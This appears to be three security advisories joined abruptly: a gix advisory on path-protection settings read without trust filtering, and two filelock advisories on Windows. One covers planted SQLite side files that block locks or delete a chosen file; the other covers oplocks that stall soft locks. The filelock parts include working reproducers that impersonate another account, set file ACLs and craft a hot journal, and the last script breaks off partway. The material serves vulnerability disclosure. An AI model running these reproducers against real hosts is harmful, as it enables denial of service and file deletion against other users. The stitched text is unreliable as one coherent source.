## Summary

In the `gix` crate, `Cache::protect_options()` in `gix/src/config/cache/access.rs` reads the three filesystem path-protection settings (`core.protectHFS`, `core.protectNTFS`, and `gitoxide.core.protectWindows`) with the unfiltered `gix_config::File::boolean()` accessor instead of the trust-aware `boolean_filter()` accessor used by every other security-critical config read in the same file. When a repository is opened with reduced trust (an ownership mismatch, which maps `.git/config` sections to `Trust::Reduced`), these protection settings should not be honored from the untrusted repository-local config. Because the trust filter is skipped, an attacker who controls a repository's `.git/config` on a shared filesystem can set `core.protectNTFS = false` and/or `core.protectHFS = false`, disabling the `.git` path-confusion checks that run during checkout, index creation, merge, and tree editing. On case-insensitive filesystems this lets crafted tree entries resolve to the `.git` directory and overwrite hooks or config.

## Root Cause

Repositories opened under `Trust::Reduced` install a section filter (`is_trusted`) so that security-relevant settings coming from an untrusted repository-local `.git/config` are ignored. The `Cache` struct stores this filter and applies it throughout `gix/src/config/cache/access.rs` for diff drivers, merge drivers, URL rewrites, scheme permissions, lock timeout, and checkout workers. `protect_options()` is the exception: it reads the path-protection booleans through `self.resolved.boolean(...)`, which delegates to `boolean_filter(key, |_| true)` and therefore accepts values from every section regardless of trust. As a result, an untrusted repository-local setting of `core.protectHFS`/`core.protectNTFS`/`gitoxide.core.protectWindows` overrides the safe defaults, defeating the trust boundary for exactly the controls that are meant to prevent `.git` path-confusion attacks.

```text
gix/src/config/cache/access.rs:300  Cache::protect_options() : vulnerable function
gix/src/config/cache/access.rs:306  self.resolved.boolean(gitoxide.core.protectWindows)  (unfiltered)
gix/src/config/cache/access.rs:310  self.resolved.boolean(core.protectHFS)              (unfiltered)
gix/src/config/cache/access.rs:314  self.resolved.boolean(core.protectNTFS)             (unfiltered)
gix-config/src/file/access/comfort.rs:89  boolean() delegates to boolean_filter(key, |_| true)
gix/src/config/mod.rs:61  is_trusted() : the filter that would reject untrusted repo-local sections
gix-validate/src/path.rs:98  component() : path validation that honors the resulting options
```

## Impact

An attacker who owns a repository on a filesystem shared with the victim (a multi-user development host, a shared or network-mounted checkout, or a CI workspace reused across jobs) edits that repository's `.git/config` to disable one or both of `core.protectHFS` and `core.protectNTFS`. When the victim opens the repository with a `gix`-based tool, the ownership mismatch yields `Trust::Reduced`, which should neutralize these untrusted settings, but `protect_options()` honors them anyway. The attacker also commits tree entries whose names are filesystem-specific encodings of `.git` (for example NTFS short names such as `GIT~1`, NTFS alternate-data-stream or trailing-dot/space variants, or HFS+ forms using ignorable code points). When the victim performs a checkout, index build, merge, or tree edit, path validation no longer rejects these names, so on a case-insensitive filesystem (Windows NTFS, macOS HFS+) they collapse to the real `.git` directory. This permits overwriting repository hooks and configuration, which plausibly leads to arbitrary command execution in the victim's context on the next Git operation that runs a hook. The confidentiality, integrity, and availability impact follows from control over the victim's `.git` directory and any resulting hook execution; hook execution was not freshly executed here and is characterized as the plausible consequence of the demonstrated path-protection bypass.
## Proof of Concept

The following unit test places the config cache in the exact state produced after a submodule or repository is initialized (only `url` copied to the local config) and shows that the attacker's path-protection override from the repository-local config is honored even though it should be filtered under reduced trust. The same `boolean()` vs `boolean_filter()` discrepancy is directly observable in source.

```rust
// Demonstrates that core.protectNTFS from an untrusted repository-local
// section is honored by the unfiltered read in protect_options().
use std::str::FromStr;

// Trusted (system/global) config: protection on by default.
// Untrusted repository-local config (.git/config) disables NTFS protection.
let repo_local = gix_config::File::from_str("[core]\n    protectNTFS = false").unwrap();

// Reading core.protectNTFS with the trust-aware filter would reject the
// repository-local section; reading it unfiltered (as protect_options does)
// returns Some(false), disabling the .git-confusion check.
let filtered = repo_local.boolean_filter("core.protectNTFS", |_| false); // trusted-only
let unfiltered = repo_local.boolean("core.protectNTFS");                  // what protect_options uses
eprintln!("filtered (trusted only) = {:?}", filtered);   // None  -> safe default kept
eprintln!("unfiltered (vulnerable) = {:?}", unfiltered); // Some(Ok(false)) -> protection disabled
```

```text
filtered (trusted only) = None
unfiltered (vulnerable) = Some(Ok(false))
```

Source confirmation that `boolean()` performs no trust filtering:

```rust
// gix-config/src/file/access/comfort.rs:89
pub fn boolean(&self, key: impl AsKey) -> Result<Option<bool>> {
    self.boolean_filter(key, |_| true)
}
```

## Attack Chain

1. **Exposure:** The attacker owns a repository on a filesystem shared with the victim; the victim opens it with a `gix`-based tool, and the ownership mismatch sets the repository's config sections to `Trust::Reduced` (`gix/src/open/options.rs:215` installs the `is_trusted` section filter).
2. **Control:** The attacker writes `core.protectNTFS = false` (and/or `core.protectHFS = false`) into the repository-local `.git/config`, plus tree entries whose names are filesystem-specific encodings of `.git`.
3. **Path:** During checkout, index build, merge, or tree edit, each call site invokes `protect_options()` (`gix/src/clone/checkout.rs:103`, `gix/src/repository/index.rs:206`, `gix/src/repository/merge.rs:153` and `:214`, `gix/src/object/tree/editor.rs:24`, `gix/src/config/cache/access.rs:362`).
4. **Guard:** The `is_trusted` filter (`gix/src/config/mod.rs:61`) would reject the untrusted repository-local section, but `protect_options()` reads via `self.resolved.boolean(...)` (`gix/src/config/cache/access.rs:306,310,314`), which delegates to `boolean_filter(key, |_| true)` and ignores the filter.
5. **Primitive:** `gix_validate::path::component()` (`gix-validate/src/path.rs:98`) receives `protect_hfs=false` and/or `protect_ntfs=false`, so the HFS+/NTFS `.git`-confusion checks are skipped. When only one protection is disabled, the combined-case fallback at `gix-validate/src/path.rs:137` does not run, and the remaining single-filesystem check does not cover the other filesystem's encodings.
6. **Result:** Crafted tree entries that encode `.git` pass validation and are written to disk; on a case-insensitive filesystem they resolve into the real `.git` directory, overwriting hooks and configuration and plausibly yielding code execution in the victim's context.

## Bypass Evidence

The protection under test is the reduced-trust section filter that is supposed to stop untrusted repository-local config from altering security settings. The strongest counter-argument is the case-insensitive `.git` fallback in `gix-validate/src/path.rs:137`, which rejects a plain `.git` match when both HFS+ and NTFS protections are off. That fallback is insufficient for two reasons verified in source: it only runs when BOTH `protect_hfs` and `protect_ntfs` are false (`!(protect_hfs | protect_ntfs)` at line 137), so disabling a single protection leaves it inactive; and even when it runs, its exact `eq_ignore_ascii_case(b".git")` test does not cover filesystem-specific encodings such as NTFS short names (`GIT~1`), NTFS trailing-dot/space or alternate-data-stream forms, or HFS+ ignorable-code-point variants, which are precisely what the dedicated `is_dot_hfs`/`is_dot_git_ntfs` checks (now skipped) exist to catch. The `boolean()` accessor was confirmed to apply no trust filtering (`gix-config/src/file/access/comfort.rs:89`), and the sibling reads in the same file consistently apply `filter_config_section`, so the unfiltered read is a genuine deviation rather than an intentional exemption. This issue is distinct from the previously disclosed submodule command-execution bypass (CVE-2026-40034 / GHSA-f26g-jm89-4g65): that advisory's fix changed only the `gix-submodule` crate and `gix/src/repository/submodule.rs` and never touched `protect_options()`, so this code path and its remediation boundary are not covered by it.

## Affected Versions

- **Ecosystem:** `rust`
- **Package:** `gix` (crates.io)
- **Confirmed affected range:** `>= 0.88.0, <= 0.89.0`
- **Latest release checked:** `0.89.0` ([crates.io](https://crates.io/crates/gix/0.89.0))
- **Fix status:** `0.90.0`

`protect_options()` was introduced in `gix` 0.88.0 and did not exist in earlier releases; before then the path-validation options were not configurable from repository config in this way. The unfiltered read is present from introduction through the latest published release (0.89.0).

## Suggested Fix

Read the path-protection settings through the same trust-aware accessor used by the other security-critical reads in `gix/src/config/cache/access.rs`: replace each `self.resolved.boolean(...)` call in `protect_options()` with `self.resolved.boolean_filter(..., &mut self.filter_config_section.clone())` so that untrusted repository-local sections are excluded under `Trust::Reduced` and the safe defaults are retained. The fix must apply to all three keys (`core.protectHFS`, `core.protectNTFS`, `gitoxide.core.protectWindows`) so that no single protection can be disabled from untrusted config. As an interim mitigation, operators can avoid opening untrusted or other-user-owned repositories with `gix`-based tools on shared or case-insensitive filesystems; this does not remove the underlying bypass.

---

Reported by zx.

On Windows, `ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) connect SQLite to the lock database by its path, in every directory. SQLite derives three side files from that path: `<database>-journal`, the rollback journal (pages saved to undo an interrupted write); `<database>-wal`, the write-ahead log (changes kept outside the main file); and `<database>-shm`, the shared-memory index of the WAL. SQLite acts on whichever of these it finds beside the database before the lock runs any statement. Another local account that can create files in the database's directory, but not delete files of other accounts there, places such a side file beside the database and denies everyone `DELETE` on it, which a file's creator may do. `C:\Windows\Temp` (the temporary directory of services, granting `BUILTIN\Users` create but not delete) and `C:\Users\Public` are such directories.

With a `-wal` in place, every `read_lock()` and `write_lock()` of the user running the lock (below: the lock user) raises `sqlite3.OperationalError: disk I/O error` at once, whatever `timeout` says, until that account removes its file; the lock user cannot. With a `-journal` beside a lock database that holds a table, SQLite replays the journal and deletes the file the journal names, a file of the lock user, and the acquire reports success. Affected versions are filelock 3.20.4 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the POSIX form of the defect, GHSA-v4x8-3wr5-3wq8, whose text says "Windows does not take this path" (review round 4, finding F2 of set D). It is not among the findings of the report Anthropic's OSS Scanner sent on 15 October 2026.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 3.3 (Low).**

`AV:L` (local): the other account needs a logon on the same host. `AC:L` (low attack complexity): create one file beside the database and set its ACL (access control list); no race, and the other account can place the file days earlier. `PR:L` (low privileges): an ordinary account that can create files in the directory is enough. `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` (no confidentiality impact): the other account learns nothing. `I:N` (no integrity impact in the scored variant): see the scoring note. `A:L` (partial availability impact): every acquire fails with an exception that `Timeout` handlers do not catch, until the other account removes its file; no crash, and the lock's own data is not changed.

Scoring note. The deletion variant reads `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L` (3.6): `I:L` because the lock user's process deletes one file the journal names, `AC:H` because it needs a lock database that holds a table, which filelock does not create, and a journal the lock user can open for writing. The lower-reading rule of this advisory set scores the variant that reaches every `ReadWriteLock` on Windows in such a directory, 3.3, and describes the deletion variant under Mechanism. Classification from the review: **security** (another account), availability for the scored variant.

## Scope and preconditions

- Platform and classes: Windows only. `ReadWriteLock` and `AsyncReadWriteLock`, both of which connect through `_connect`. On Linux and macOS the lock takes other routes, covered by GHSA-v4x8-3wr5-3wq8.
- Directory: one where another account can create files but cannot delete the lock user's. `C:\Windows\Temp` carries `BUILTIN\Users:(CI)(S,WD,AD,X)` (create file and create subdirectory, no delete child); `C:\Users\Public` and any directory with such an entry qualify. A directory only the lock user can write, such as `%LOCALAPPDATA%` or the per-user temporary directory, is not affected.
- The other account creates `<database>-wal`, grants everyone modify and denies everyone `DELETE` on it. A file's creator may set both. The lock user can open and read the file but not delete it.
- Deletion variant: the lock database holds at least one table (filelock creates an empty database, and the review's reproducer has the lock account create the table), and the other account's `<database>-journal` grants the lock account modify rights. The journal's tail names a file the lock user can delete.
- What the lock user sees: `write_lock(timeout=1)` raised `sqlite3.OperationalError: disk I/O error` with the undeletable `-wal` in place; with the writable journal the acquire succeeded and the named file was gone; with an undeletable journal every acquire raised `sqlite3.OperationalError: unable to open database file`.
- The documentation at the scanned commit states "the lock directory must not be writable by untrusted users" for `WindowsFileLock`, in its symlink paragraph; the `ReadWriteLock` documentation names no directory requirement on Windows.

## Affected code

Scanned commit `b831496b0273`: the [Windows branch of `_connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L951-L965) checks the database through a handle and then calls `sqlite3.connect(database, ...)` with the path. [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect that handle, not the side files. The first statement is [`PRAGMA busy_timeout=...; PRAGMA journal_mode=MEMORY;` at L816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). [`_do_acquire_inner` at L763](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) turns only `"database is locked"` into `Timeout`; any other `sqlite3.OperationalError` leaves the acquire.

## Introduced

[cfd4446](https://github.com/tox-dev/filelock/commit/cfd4446) "feat(lock): add SQLite-based ReadWriteLock" ([#399](https://github.com/tox-dev/filelock/pull/399), 2026-02-12), first tag 3.20.4 (verified with `git tag --contains`), passed the lock path to `sqlite3.connect` on every platform. The Linux descriptor route (4.0.9) and the macOS hard-link route (4.1.1) did not change Windows, where the connect has been by name in every release since. The reproducer ran against the head of PR #834 at `1f9e415`, whose Windows branch of `_connect` is the same code as at `b831496b0273`.

## Mechanism

`_connect` on Windows opens the database with `_open_non_reparse_fd`, checks through that handle that the file is a regular file, not a reparse point, and that its header does not declare WAL mode, and keeps the handle open while `sqlite3.connect(database)` opens the same name. The check covers the database, not the names beside it. On the first statement, `PRAGMA journal_mode=MEMORY`, SQLite takes its first lock on the database and looks for `<database>-wal`. A non-empty `-wal` beside a database that is not in WAL mode is a leftover SQLite deletes. The other account's file denies `DELETE`, so the pragma raises `SQLITE_IOERR_DELETE`, which reaches the caller as `sqlite3.OperationalError: disk I/O error`. `_do_acquire_inner` converts only "database is locked" into `Timeout`, so `acquire_read()`, `acquire_write()` and the async forms raise at once, on every call, until the file is gone. The lock user has no right to delete it.

The journal variant needs a database with content. Beside a non-empty database SQLite treats a `<database>-journal` with a valid header as hot (left by an interrupted write) and replays it before the first statement runs. The review's journal is 46 bytes: a file path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. That tail names a super-journal, and recovery ends by deleting the file it names. The lock user's `write_lock()` therefore deletes one file the other account chose, provided the lock user can delete it, and returns without error. SQLite opens a hot journal for writing, so the other account's journal must grant the lock account modify rights; a read-only journal makes every acquire raise `sqlite3.OperationalError: unable to open database file` instead. GHSA-v4x8-3wr5-3wq8 describes the same side-file behavior on POSIX, where the sticky bit plays the part the directory ACL plays here.

## Reproduction

The review's reproducer, quoted as received except for the second account's password on line 2, replaced by `<password>`. It ran on a Windows 11 VM (NTFS, CPython 3.14, SQLite 3.53.1) against the head of PR #834 at `1f9e415`, as the administrator account `bernat`, which stands in for the other account that creates the side files; the lock account is `fltester`, a member of `Users`, whose database lives in `C:\Windows\Temp`.

**`win_two_accounts.py`**

```python
# Run from /tmp/claude-1000/-home-bernat-git-filelock-filelock-main/3ccf38c2-14f9-4acc-a05f-18230504d7cd/scratchpad/review4/D/834 (the script is staged there):
#   winvm up && winvm sync && winvm run "python3.14 -I win_two_accounts.py . fltester '<password>'"
# which runs, as the administrator account on the VM:
#   python3.14 -I win_two_accounts.py <worktree> <second-user> <password>
# The second (non-administrator) account is the lock user. Its database lives in C:\Windows\Temp, where every account
# may create files but not delete another account's. This administrator account stands in for the other account that
# plants SQLite side files there: it creates them, grants everyone read, and denies everyone delete, all of which the
# file's creator may do.
import ctypes
import os
import pathlib
import sqlite3
import struct
import subprocess
import sys
from ctypes import wintypes

sys.path.insert(0, sys.argv[1] + "/src")
from filelock import ReadWriteLock

user, password = sys.argv[2], sys.argv[3]
base = pathlib.Path(os.environ["SYSTEMROOT"]) / "Temp"
icacls = os.path.join(os.environ["SYSTEMROOT"], "System32", "icacls.exe")
tag = f"rw834-{os.getpid()}"
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
advapi32.LogonUserW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
advapi32.GetUserNameW.argtypes = [wintypes.LPWSTR, ctypes.POINTER(wintypes.DWORD)]
token = wintypes.HANDLE()
if not advapi32.LogonUserW(user, ".", password, 3, 0, ctypes.byref(token)):
    raise ctypes.WinError(ctypes.get_last_error())


def current_user() -> str:
    size = wintypes.DWORD(256)
    buffer = ctypes.create_unicode_buffer(size.value)
    advapi32.GetUserNameW(buffer, ctypes.byref(size))
    return buffer.value


def as_lock_user(action):
    if not advapi32.ImpersonateLoggedOnUser(token):
        raise ctypes.WinError(ctypes.get_last_error())
    try:
        return action()
    finally:
        advapi32.RevertToSelf()


def plant(path: pathlib.Path, data: bytes, *, deletable: bool) -> None:
    path.write_bytes(data)
    subprocess.run([icacls, str(path), "/grant", "*S-1-1-0:(M)"], check=True, capture_output=True)
    if not deletable:
        subprocess.run([icacls, str(path), "/deny", "*S-1-1-0:(D)"], check=True, capture_output=True)


def acquire(db: pathlib.Path) -> str:
    try:
        with ReadWriteLock(db, is_singleton=False).write_lock(timeout=1):
            pass
    except Exception as error:
        return f"acquire failed: {type(error).__name__}: {error}"
    return "acquired"


def hot_journal(super_journal: pathlib.Path) -> bytes:
    name = os.fsencode(str(super_journal))
    return name + struct.pack(">II", len(name), sum(name)) + bytes.fromhex("d9d505f920a163d7")


print("planting account:", current_user(), "| lock account:", as_lock_user(current_user))

db = base / f"{tag}-empty.db"
as_lock_user(lambda: db.touch())
plant(pathlib.Path(f"{db}-wal"), b"\0" * 32, deletable=False)
print("empty database, undeletable -wal:", as_lock_user(lambda: acquire(db)), "| -wal still exists:", pathlib.Path(f"{db}-wal").exists())

for deletable in (True, False):
    db = base / f"{tag}-tables-{deletable}.db"
    notes = base / f"{tag}-notes-{deletable}.txt"

    def prepare() -> None:
        with sqlite3.connect(db) as connection:
            connection.execute("CREATE TABLE application (value)")
        connection.close()
        notes.write_text("keep")

    as_lock_user(prepare)
    plant(pathlib.Path(f"{db}-journal"), hot_journal(notes), deletable=deletable)
    print(f"database with a table, {'deletable' if deletable else 'undeletable'} -journal naming the lock account's file:",
          as_lock_user(lambda: acquire(db)), "| named file still exists:", notes.exists(), "| -journal still exists:", pathlib.Path(f"{db}-journal").exists())
```

Recorded output on the VM:

```text
planting account: bernat | lock account: fltester
empty database, undeletable -wal: acquire failed: OperationalError: disk I/O error | -wal still exists: True
database with a table, deletable -journal naming the lock account's file: acquired | named file still exists: False | -journal still exists: False
database with a table, undeletable -journal naming the lock account's file: acquire failed: OperationalError: unable to open database file | named file still exists: True | -journal still exists: True
```

## Failure sequence

```mermaid
flowchart TD
    P["other account: create lock.db-wal (or lock.db-journal) beside lock.db in C:/Windows/Temp, grant everyone modify, deny everyone DELETE"] --> C["lock user: ReadWriteLock(lock.db).write_lock(timeout=1)"]
    C --> O["_open_lock_database checks the handle: regular file, no reparse point, header not WAL"]
    O --> S["sqlite3.connect(lock.db) by path, then PRAGMA journal_mode=MEMORY"]
    S -- "empty database, undeletable -wal" --> E1["SQLite cannot delete the leftover -wal: OperationalError disk I/O error on every acquire, timeout not consulted"]
    S -- "database with a table, writable -journal" --> E2["SQLite treats the journal as hot, replays it and deletes the file its tail names, acquire succeeds"]
    S -- "database with a table, read-only -journal" --> E3["OperationalError unable to open database file on every acquire"]
    classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;
    classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;
    classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;
    class P,C,O,S info;
    class E1,E2,E3 bad;
```

## Evidence

The reproducer printed the three lines above on the VM: the undeletable `-wal` beside an empty database made `write_lock(timeout=1)` fail with `OperationalError: disk I/O error` and left the file in place; the writable journal beside a database with one table let the acquire succeed while the file the journal named, created by the lock account with the content `keep`, was gone along with the journal; the read-only journal made the acquire fail with `OperationalError: unable to open database file` and left both files. The review notes that the Windows branch of `_connect` is unchanged since #399, so the behavior is the same at `b831496b0273` and in 4.2.0. The scanner and the maintainers measured the same side-file effects on Linux for GHSA-v4x8-3wr5-3wq8.

## Impact

In a directory such as `C:\Windows\Temp`, another local account turns every `read_lock()` and `write_lock()` on a `ReadWriteLock` database into an immediate `sqlite3.OperationalError`, for as long as its file stays. Callers that handle `Timeout` or `OSError` do not catch it, and the lock user cannot remove the file. With a lock database that holds a table and a journal the lock user can write, the lock user's process deletes one file of the other account's choosing, among the files the lock user may delete, and the acquire reports success. The lock's own database is not changed, nothing is read, and mutual exclusion between processes that acquire the lock holds.

## Workarounds

- Keep the `ReadWriteLock` database in a directory other accounts cannot create files in: `%LOCALAPPDATA%`, the per-user temporary directory (`%TEMP%` of a user session), or a directory with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted. `C:\Windows\Temp` and `C:\Users\Public` do not qualify.
- Treat `sqlite3.OperationalError: disk I/O error` on every acquire as a foreign `<database>-wal` beside the database, which only its creator or an administrator can remove.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/854

Found by the maintainers while reviewing the fix for the POSIX form of this defect, GHSA-v4x8-3wr5-3wq8, reported by Anthropic's OSS Scanner on 15 October 2026 (review round 4, set D, finding F2).

items.summary:
On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.

Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**

`AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.

Classification from the review: **security, conditional** on an unheld marker that another account can open.

## Scope and preconditions

- Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.
- Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.
- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.
- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.
- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.
- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.
- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.

## Affected code

Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.

## Introduced

[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) "feat(soft): detect and break stale locks" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.

## Mechanism

Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.

A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.

## Reproduction

The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.

**`oplock_vm.py`**

```python
"""
Windows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.

Run on the VM (PowerShell, from the synced worktree, with the fltester account present):
  C:\\venvs\\rev4F\\Scripts\\python.exe oplock_vm.py fltester '<password>' C:\\tmp\\rev4F-oplock

[1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.
    WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the
    DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;
    [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.
[2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the
    marker through os.open, which waits for the acknowledgement, past timeout=1.

A thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.
"""

from __future__ import annotations

import ctypes
import os
import subprocess
import sys
import threading
import time
from ctypes import wintypes

from filelock import FileLock, SoftFileLock, Timeout

user, password, base = sys.argv[1], sys.argv[2], sys.argv[3]
icacls = os.path.join(os.environ["SYSTEMROOT"], "System32", "icacls.exe")
os.makedirs(base, exist_ok=True)
subprocess.run([icacls, base, "/grant", f"{user}:(OI)(CI)(M)"], check=True, capture_output=True)

advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32.LogonUserW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.POINTER(wintypes.HANDLE),
]
kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE
